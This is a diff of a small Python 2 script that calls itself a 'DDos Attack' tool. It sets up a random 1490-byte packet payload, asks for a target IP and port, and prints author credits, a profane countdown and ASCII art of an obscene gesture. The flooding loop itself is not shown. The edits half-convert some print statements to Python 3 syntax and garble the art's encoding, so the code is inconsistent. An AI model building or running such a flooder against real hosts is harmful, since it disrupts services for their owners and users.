@@ -20,10 +20,10 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet DDos Attack")
 print
-print "Creator   : BTANONOPS ITSEC"
-print "You Tube : DON'T HAVE"
-print "github   : https://github.com/bac123hub"
-print "Facebook : https://www.facebook.com/bactrananonymous"
+print ("Creator   : BTANONOPS ITSEC")
+print ("You Tube : DON'T HAVE")
+print ("github   : https://github.com/bac123hub")
+print ("Facebook : https://www.facebook.com/bactrananonymous")
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
@@ -46,14 +46,14 @@ print "STEADY"
 time.sleep(3)
 print "LET'S FUCK"
 time.sleep(1)
-print "                      /´¯¯/"
-print "                     /¯.../"
+print "                      /Â´Â¯Â¯/"
+print "                     /Â¯.../"
 print "                    /..../"
-print "               /´¯/'..'/´¯¯`·¸"
-print "            /'/.../..../....../¨¯\"
-print "          ('(....´...´... ¯~/'..')"
+print "               /Â´Â¯/'..'/Â´Â¯Â¯`Â·Â¸"
+print "            /'/.../..../....../Â¨Â¯\"
+print "          ('(....Â´...Â´... Â¯~/'..')"
 print "           \..............'...../"
-print "            \....\.........._.·´"
+print "            \....\.........._.Â·Â´"
 print "             \..............("
 print "              \..............\"
 sent = 0
